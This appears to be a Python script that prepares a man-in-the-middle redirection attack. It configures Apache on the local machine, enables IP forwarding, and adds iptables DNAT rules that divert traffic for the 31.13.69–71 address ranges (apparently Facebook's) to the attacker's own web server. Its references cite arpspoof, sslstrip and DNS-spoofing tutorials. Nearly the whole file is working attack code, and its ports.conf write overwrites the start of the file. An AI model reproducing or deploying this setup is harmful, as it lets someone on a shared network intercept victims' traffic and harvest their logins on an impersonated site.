import os
import subprocess

# Detect current IP address.
cmd = "/sbin/ifconfig | grep \'inet addr\'"
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()
(output, error) = p.communicate()
rawIPList = output.split()
modIPList = []
myIP = ""

for ip in rawIPList:
	if 'addr:' in ip:
		modIPList.append(ip[5:])

for ip in modIPList:
	if ip != '127.0.0.1':
		myIP = ip


# Add Listener to apache2 service for IP.
f = open("/etc/apache2/ports.conf", 'r+')
f.write("NameVirtualHost *:80\n")
f.write("Listen " + myIP + ":80")


# Restart apache service.
cmd = "/etc/init.d/apache2 restart"
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()


# Enable iprouting.
cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()


# Configure routing table for the first domain IP.
cmd = "iptables -t nat -A PREROUTING -d 31.13.69.1/24 -j DNAT --to-destination " + myIP
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()

# Configure routing table for the second domain IP.
cmd = "iptables -t nat -A PREROUTING -d 31.13.70.1/24 -j DNAT --to-destination " + myIP
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()

# Configure routing table for the third domain IP.
cmd = "iptables -t nat -A PREROUTING -d 31.13.71.1/24 -j DNAT --to-destination " + myIP
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()

# Configure the routing table to accept incoming traffic on port 80.
cmd = "iptables -A INPUT -p tcp --dport 80 -j ACCEPT"
p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
p.wait()


# Workflow
# 1. Need to add "Listen <MY_IP>:80" to file /etc/apache2/ports.conf with other Listen statements at top 
# 2. Need to restart apache2: /etc/init.d/apache2 restart
# 3. Need to turn on iprouting using: echo 1 > /proc/sys/net/ipv4/ip_forward
# 4. iptables routing: iptables -t nat -A PREROUTING -d 31.13.69.1/24 -j DNAT --to-destination 192.168.1.10
# 5. Accept incoming connections: iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# References
# http://robospatula.blogspot.com/2013/12/man-in-the-middle-attack-arpspoof-sslstrip.html
# https://tournasdimitrios1.wordpress.com/2011/03/03/dns-spoofing-with-dnsspoof-on-linux/
# http://www.cyberciti.biz/faq/linux-apache2-change-default-port-ipbinding/
# http://serverfault.com/questions/401416/iptables-clear-all-prerouting-rules-with-a-specific-destination-address
# http://linux-ip.net/html/nat-dnat.html
# http://www.adminsehow.com/2009/08/how-to-clear-all-iptables-rules/